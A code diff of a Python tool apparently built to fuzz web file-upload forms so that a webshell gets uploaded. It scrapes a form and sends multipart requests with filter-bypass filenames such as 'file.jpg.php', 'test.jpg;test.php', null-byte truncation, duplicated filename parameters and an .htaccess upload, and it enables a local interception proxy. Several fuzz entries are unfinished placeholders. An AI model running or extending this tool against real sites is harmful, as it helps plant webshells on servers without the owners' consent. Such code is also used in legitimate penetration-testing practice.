@@ -16,10 +16,10 @@ def get_form_data_post_info(url, cookie):
     # return_value['form_file_param_name']为multipart form data中的文件参数名
     form_data_dict = {}
     form_file_param_name = ''
-    origin_html=''
+    origin_html = ''
     return_value = {'form_data_dict': form_data_dict,
                     'form_file_param_name': form_file_param_name,
-                    'origin_html':origin_html}
+                    'origin_html': origin_html}
     rsp = get_request(url, cookie=cookie)
     origin_html = rsp['content']
     if not re.search(r"<form\s+", origin_html, re.I):
@@ -40,7 +40,7 @@ def get_form_data_post_info(url, cookie):
 
     return_value['form_data_dict'] = form_data_dict
     return_value['form_file_param_name'] = form_file_param_name
-    return_value['origin_html']=origin_html
+    return_value['origin_html'] = origin_html
     return return_value
 
 
@@ -72,11 +72,10 @@ def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_pa
         data.append('Content-Type: %s\r\n\r\n' % content_type)
         data.append(file_content + "\r\n")
     data.append('--%s--' % boundary)
-    pdb.set_trace()
     data = ''.join(data)
-    # proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
-    # opener = urllib.request.build_opener(proxy)
-    # urllib.request.install_opener(opener)
+    proxy = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
+    opener = urllib.request.build_opener(proxy)
+    urllib.request.install_opener(opener)
     req = urllib.request.Request(
         url, headers=headers, data=data.encode("utf-8"))
     with urllib.request.urlopen(req) as response:
@@ -87,7 +86,7 @@ def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_pa
     return return_value
 
 
-def get_work_file_suffix(url, cookie, form_data_dict, boundary, form_file_param_name, filename, content_type):
+def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_name, filename, content_type):
     file_suffix_list = ['jpg', 'png', 'gif', 'txt']
     for file_suffix in file_suffix_list:
         filename = "test.%s" % file_suffix
@@ -118,16 +117,16 @@ def get_work_file_suffix(url, cookie, form_data_dict, boundary, form_file_param_
     print("正常上传jpg/gif/png/txt全部失败,这个url的上传功能可能存在问题...")
     sys.exit(1)
 
-def check_upload_succeed(rsp,origin_html):
-    code=rsp['code']
-    html=rsp['html']
-    if code!=200:
+
+def check_upload_succeed(rsp, origin_html):
+    code = rsp['code']
+    html = rsp['html']
+    if code != 200:
         return False
     for line in html:
-        if not re.match(r"\s+",line) and line not in origin_html:
+        pdb.set_trace()
+        if not re.match(r"\s+", line) and line not in origin_html:
             print(line)
-    input()
-
 
 
 def fuzz_upload_webshell():
@@ -135,13 +134,20 @@ def fuzz_upload_webshell():
     # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
     filename = "file.jpg.php"
     content_type = 'image/jpeg'
-    work_file_suffix = get_work_file_suffix(url, cookie, form_data_dict, boundary,
-                                            form_file_param_name, filename, content_type)
+    work_file_info = get_work_file_info(url, cookie, form_data_dict, boundary,
+                                        form_file_param_name, filename, content_type)
+    print(work_file_info)
+    work_suffix = work_file_info['file_suffix']
+    file_content = work_file_info['file_content']
+
+    rsp = post_multipart_form_data(
+        url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+    check_upload_succeed(rsp, origin_html)
     fuzz_file_name = [
         {'desc': '修改后缀为webshell后缀',
             'modify': {'filename': 'test.%s' % script_suffix}},
-        {'desc': '修改后缀为.jpg;test.php',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+        {'desc': '修改后缀为正常后缀接";test.php",eg:"test.jpg;test.php"',
+            'modify': 'filename=test.%s;test.%s\r\nContent-Type: image/jpeg' % (work_suffix, script_suffix)},
         {'desc': '%00截断', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
         {'desc': '双文件上传', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
         {'desc': '两个filename参数',
@@ -151,6 +157,8 @@ def fuzz_upload_webshell():
         {'desc': '两个filename参数以Tab分割',
             'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
         {'desc': '两个filename参数以\\r\\n分割',
+            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+        {'desc': '上传.htaccess,只适用于php',
             'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
     ]
     fuzz_content_type = [
@@ -167,11 +175,11 @@ def fuzz_upload_webshell():
     ]
     for each in fuzz_file_name:
         filename = each['modify']['filename']
-        content_type = work_file_suffix['content_type']
-        file_content = work_file_suffix['file_content']
+        content_type = work_file_info['content_type']
+        file_content = work_file_info['file_content']
         rsp = post_multipart_form_data(
             url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
-        check_upload_succeed(rsp,origin_html)
+        check_upload_succeed(rsp, origin_html)
 
 
 parser = argparse.ArgumentParser()
@@ -183,17 +191,20 @@ url = args.url
 cookie = args.cookie
 script_suffix = args.suffix
 gif_file_content = '''GIF89a
-somethin'''
-jpg_file_content = '''
-
-'''
-png_file_content = '''
-
+something'''
+jpg_file_content = '''00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
+00000010: 0048 0000 ffdb 0043 0003 0202 0202 0203  .H.....C........
+00000020: 4bff 007f 3ffa f457 4660 8327 f729 ff00  K...?..WF`.'.)..
+00000030: 7c8a 2b4b 3ee3 e63f ffd9                 |.+K>..?..'''
+png_file_content = '''00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
+00000010: 0000 0118 0000 00d2 0806 0000 0091 8adf  ................
+00000020: 6500 3138 304b 4242 b9fe 053d 0000 0000  e.180KBB...=....
+00000030: 4945 4e44 ae42 6082                      IEND.B`.
 '''
 info = get_form_data_post_info(url, cookie)
 form_data_dict = info['form_data_dict']
 form_file_param_name = info['form_file_param_name']
-origin_html=info['origin_html']
+origin_html = info['origin_html']
 boundary = '-------------------------7df3069603d6'
 
 
